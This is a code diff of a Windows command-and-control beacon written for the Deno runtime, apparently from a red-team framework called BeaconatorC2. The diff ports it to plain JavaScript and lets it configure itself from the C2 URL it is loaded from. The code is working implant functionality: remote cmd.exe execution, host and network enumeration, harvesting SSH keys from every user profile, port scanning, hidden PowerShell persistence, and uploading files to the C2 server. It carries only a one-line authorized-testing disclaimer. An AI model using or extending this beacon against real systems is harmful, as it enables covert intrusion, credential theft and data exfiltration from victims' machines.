@@ -2,18 +2,23 @@
  * Deno Beacon for BeaconatorC2 (Windows)
  * Stage 2/3 payload for the Deno one-liner beacon.
  *
- * Stage 1 (cmd one-liner) installs Deno and pulls this file from the C2
- * server via the to_beacon|deno_beacon.ts HTTP file-transfer command, then
- * runs it with: deno run -A deno_beacon.ts
+ * Stage 1 (cmd one-liner) installs Deno, then runs the beacon as a remote
+ * module: deno run -A "http://server:port/?data=to_beacon|deno_beacon.js"
+ * The C2's HTTP receiver serves this file (staged in files/) in response to
+ * the to_beacon file-transfer command, so Deno's own module loader
+ * downloads and runs it. The beacon derives its server/port/endpoint from
+ * the module URL, so no arguments are required.
  *
  * It can also be run directly for testing:
- *   deno run -A beacons/deno_beacon.ts
+ *   deno run -A beacons/deno_beacon.js
+ *   (falls back to BC_* env vars or 127.0.0.1:8080/)
  *
- * Configuration is read from environment variables (set by stage 1):
- *   BC_SERVER   - C2 server IP/hostname (default 127.0.0.1)
- *   BC_PORT     - C2 HTTP receiver port  (default 8080)
- *   BC_ENDPOINT - HTTP endpoint path     (default /)
- *   BC_INTERVAL - check-in interval secs (default 15)
+ * Configuration priority: CLI args <server> <port> <endpoint> <interval>,
+ * then BC_SERVER/BC_PORT/BC_ENDPOINT/BC_INTERVAL env vars, then the module
+ * URL, then defaults.
+ *
+ * Plain JavaScript (no TypeScript syntax) on purpose: the module URL has no
+ * .ts extension, so Deno compiles it as JavaScript.
  *
  * Use only for authorized security testing. See LICENSE/README.md.
  */
@@ -21,11 +26,23 @@
 // ---------------------------------------------------------------------------
 // Configuration
 // ---------------------------------------------------------------------------
-// CLI args (positional) take priority, then BC_* environment variables.
-// The cmd one-liner passes: <server> <port> <endpoint> <interval>
-const SERVER = Deno.args[0] ?? Deno.env.get("BC_SERVER") ?? "127.0.0.1";
-const PORT = parseInt(Deno.args[1] ?? Deno.env.get("BC_PORT") ?? "8080", 10);
-const ENDPOINT = Deno.args[2] ?? Deno.env.get("BC_ENDPOINT") ?? "/";
+// Priority: CLI args (positional) -> BC_* environment variables -> derived
+// from the module URL itself. The last case lets a bare
+// "deno run -A http://server:port/?data=to_beacon|deno_beacon.js" be fully
+// self-configuring (interval defaults to 15s).
+function moduleUrlConfig() {
+  try {
+    const u = new URL(Deno.mainModule);
+    if (u.hostname) {
+      return { server: u.hostname, port: u.port || "80", endpoint: u.pathname || "/" };
+    }
+  } catch { /* module is not a URL */ }
+  return null;
+}
+const _uc = moduleUrlConfig();
+const SERVER = Deno.args[0] ?? Deno.env.get("BC_SERVER") ?? _uc?.server ?? "127.0.0.1";
+const PORT = parseInt(Deno.args[1] ?? Deno.env.get("BC_PORT") ?? _uc?.port ?? "8080", 10);
+const ENDPOINT = Deno.args[2] ?? Deno.env.get("BC_ENDPOINT") ?? _uc?.endpoint ?? "/";
 const INTERVAL = parseInt(Deno.args[3] ?? Deno.env.get("BC_INTERVAL") ?? "15", 10);
 
 const BASE_URL = `http://${SERVER}:${PORT}${ENDPOINT}`;
@@ -40,7 +57,7 @@ const encoder = new TextEncoder();
 // ---------------------------------------------------------------------------
 
 /** Generate a stable-ish 8 hex char beacon ID from system info + pid. */
-function generateBeaconId(): string {
+function generateBeaconId() {
   const seed = `${hostname()}|${username()}|${Date.now()}|${Deno.pid}`;
   // djb2 hash
   let h = 5381;
@@ -50,18 +67,18 @@ function generateBeaconId(): string {
   return h.toString(16).padStart(8, "0");
 }
 
-function hostname(): string {
+function hostname() {
   return Deno.env.get("COMPUTERNAME") ??
     (typeof Deno.hostname === "function" ? Deno.hostname() : "unknown-host");
 }
 
-function username(): string {
+function username() {
   return Deno.env.get("USERNAME") ??
     Deno.env.get("USERDOMAIN\\USERNAME") ?? "unknown-user";
 }
 
 /** POST a protocol message to the C2 and return the response body. */
-async function post(body: string): Promise<string> {
+async function post(body) {
   const res = await fetch(BASE_URL, {
     method: "POST",
     headers: {
@@ -74,7 +91,7 @@ async function post(body: string): Promise<string> {
 }
 
 /** Execute a shell command via cmd.exe, returning combined stdout/stderr. */
-async function runCmd(command: string): Promise<string> {
+async function runCmd(command) {
   try {
     const cmd = new Deno.Command("cmd.exe", {
       args: ["/c", command],
@@ -95,11 +112,11 @@ async function runCmd(command: string): Promise<string> {
   }
 }
 
-function sleep(ms: number): Promise<void> {
+function sleep(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
 
-function splitParams(params: string): string[] {
+function splitParams(params) {
   return params.split(",").map((p) => p.trim());
 }
 
@@ -107,7 +124,7 @@ function splitParams(params: string): string[] {
 // Modules (execute_module|{module}|{params})
 // ---------------------------------------------------------------------------
 
-async function moduleSystemInfo(): Promise<string> {
+async function moduleSystemInfo() {
   let osRelease = "unknown";
   try {
     osRelease = (typeof Deno.osRelease === "function")
@@ -117,13 +134,12 @@ async function moduleSystemInfo(): Promise<string> {
 
   let ppid = "n/a";
   try {
-    ppid = String((Deno as { ppid?: number }).ppid ?? "n/a");
+    ppid = String(Deno.ppid ?? "n/a");
   } catch { /* keep n/a */ }
 
   let mem = "n/a";
   try {
-    const mu = (Deno as { memoryUsage?: () => { rss: number } })
-      .memoryUsage?.();
+    const mu = Deno.memoryUsage();
     if (mu) mem = `${Math.round(mu.rss / 1024 / 1024)} MB RSS`;
   } catch { /* keep n/a */ }
 
@@ -141,7 +157,7 @@ async function moduleSystemInfo(): Promise<string> {
   ].join("\n");
 }
 
-async function moduleProcessEnum(): Promise<string> {
+async function moduleProcessEnum() {
   let out = "=== PROCESS ENUMERATION ===\n";
   const tasklist = await runCmd("tasklist /v /fo list");
   if (tasklist.includes("STDOUT")) {
@@ -152,7 +168,7 @@ async function moduleProcessEnum(): Promise<string> {
   return out;
 }
 
-async function moduleNetworkEnum(): Promise<string> {
+async function moduleNetworkEnum() {
   let out = "=== NETWORK ENUMERATION ===\n";
   out += "Interfaces:\n";
   out += await runCmd("ipconfig /all");
@@ -163,7 +179,7 @@ async function moduleNetworkEnum(): Promise<string> {
   return out;
 }
 
-async function moduleUserEnum(): Promise<string> {
+async function moduleUserEnum() {
   let out = "=== USER ENUMERATION ===\n";
   out += `Current User: ${Deno.env.get("USERDOMAIN") ?? ""}\\${username()}\n`;
   out += "Privileges (whoami /all):\n";
@@ -175,7 +191,7 @@ async function moduleUserEnum(): Promise<string> {
   return out;
 }
 
-async function moduleServiceEnum(): Promise<string> {
+async function moduleServiceEnum() {
   let out = "=== SERVICE ENUMERATION ===\n";
   const sc = await runCmd("sc query state= all");
   if (sc.includes("STDOUT") && !sc.includes("STDERR")) {
@@ -187,22 +203,19 @@ async function moduleServiceEnum(): Promise<string> {
   return out;
 }
 
-async function moduleEnvironmentEnum(): Promise<string> {
+async function moduleEnvironmentEnum() {
   const env = Deno.env.toObject();
   const keys = Object.keys(env).sort();
   const lines = keys.map((k) => `${k}=${env[k]}`);
   return "=== ENVIRONMENT ENUMERATION ===\n" + lines.join("\n") + "\n";
 }
 
-async function moduleFileSearch(
-  directory: string,
-  pattern: string,
-): Promise<string> {
+async function moduleFileSearch(directory, pattern) {
   const dir = directory || Deno.cwd();
   const pat = (pattern || "txt").toLowerCase();
-  const results: string[] = [];
+  const results = [];
 
-  const walk = (d: string, depth: number): void => {
+  const walk = (d, depth) => {
     if (results.length >= MAX_RESULTS || depth > 10) return;
     let entries;
     try {
@@ -237,14 +250,14 @@ async function moduleFileSearch(
   return out;
 }
 
-async function scanPort(host: string, port: number): Promise<boolean> {
+async function scanPort(host, port) {
   try {
     const conn = await Promise.race([
       Deno.connect({ hostname: host, port }),
       new Promise((_resolve, reject) =>
         setTimeout(() => reject(new Error("timeout")), PORT_TIMEOUT)
       ),
-    ]) as Deno.Conn;
+    ]);
     conn.close();
     return true;
   } catch {
@@ -252,7 +265,7 @@ async function scanPort(host: string, port: number): Promise<boolean> {
   }
 }
 
-async function modulePortScan(target: string, ports: string): Promise<string> {
+async function modulePortScan(target, ports) {
   const host = target || "127.0.0.1";
   const portList = (ports || "22,80,443,3389")
     .split(/[,\s]+/)
@@ -267,10 +280,10 @@ async function modulePortScan(target: string, ports: string): Promise<string> {
   return out;
 }
 
-async function moduleDnsEnum(domain: string): Promise<string> {
+async function moduleDnsEnum(domain) {
   const dom = domain || "example.com";
   let out = `=== DNS ENUMERATION ===\nDomain: ${dom}\n`;
-  const types = ["A", "AAAA", "CNAME", "MX", "NS", "TXT"] as const;
+  const types = ["A", "AAAA", "CNAME", "MX", "NS", "TXT"];
   for (const t of types) {
     try {
       const records = await Deno.resolveDns(dom, t);
@@ -283,11 +296,11 @@ async function moduleDnsEnum(domain: string): Promise<string> {
   return out;
 }
 
-async function moduleSshDiscovery(): Promise<string> {
+async function moduleSshDiscovery() {
   let out = "=== SSH KEY DISCOVERY ===\n";
-  const found: string[] = [];
+  const found = [];
 
-  const scanSshDir = (sshDir: string) => {
+  const scanSshDir = (sshDir) => {
     let entries;
     try {
       entries = [...Deno.readDirSync(sshDir)];
@@ -308,7 +321,7 @@ async function moduleSshDiscovery(): Promise<string> {
   }
 
   // All user profiles
-  let userDirs: string[] = [];
+  let userDirs = [];
   try {
     userDirs = [...Deno.readDirSync("C:\\Users")]
       .filter((e) => e.isDirectory && !e.name.startsWith("Public"))
@@ -327,10 +340,7 @@ async function moduleSshDiscovery(): Promise<string> {
   return out;
 }
 
-async function modulePersistence(
-  method: string,
-  command: string,
-): Promise<string> {
+async function modulePersistence(method, command) {
   const cmd = command || `powershell -NoP -W Hidden -Command "<your command>"`;
   let out = `=== PERSISTENCE ===\nMethod: ${method}\nCommand: ${cmd}\n`;
 
@@ -377,10 +387,7 @@ async function modulePersistence(
 }
 
 /** Download a file from the C2 server's files/ directory (to_beacon). */
-async function moduleDownloadFile(
-  filename: string,
-  destination?: string,
-): Promise<string> {
+async function moduleDownloadFile(filename, destination) {
   const name = filename.replace(/[\r\n]/g, "");
   if (!name) return "ERROR: no filename provided\n";
 
@@ -416,11 +423,11 @@ async function moduleDownloadFile(
  * after the 'from_beacon|{name}' command body, with the client closing the
  * connection to signal end-of-data, so this speaks raw HTTP over a socket.
  */
-async function moduleUploadFile(path: string): Promise<string> {
+async function moduleUploadFile(path) {
   const cleanPath = path.replace(/^"|"$/g, "").trim();
   if (!cleanPath) return "ERROR: no file path provided\n";
 
-  let data: Uint8Array;
+  let data;
   try {
     data = await Deno.readFile(cleanPath);
   } catch (e) {
@@ -441,9 +448,7 @@ async function moduleUploadFile(path: string): Promise<string> {
       await conn.write(encoder.encode(request));
       await conn.write(data);
       // Half-close so the server sees end-of-file, then read the response.
-      try {
-        (conn as unknown as { closeWrite?: () => void }).closeWrite?.();
-      } catch { /* older Deno without closeWrite */ }
+      try { conn.closeWrite(); } catch { /* older Deno without closeWrite */ }
       const buf = new Uint8Array(2048);
       const n = await conn.read(buf);
       if (n) {
@@ -468,7 +473,7 @@ async function moduleUploadFile(path: string): Promise<string> {
 
 const ID = generateBeaconId();
 
-async function handleCommand(commandData: string): Promise<string> {
+async function handleCommand(commandData) {
   const cmd = commandData.trim();
 
   if (cmd === "shutdown" || cmd === "execute_module|Cleanup") {
@@ -590,3 +595,5 @@ async function main() {
 }
 
 await main();
+
+
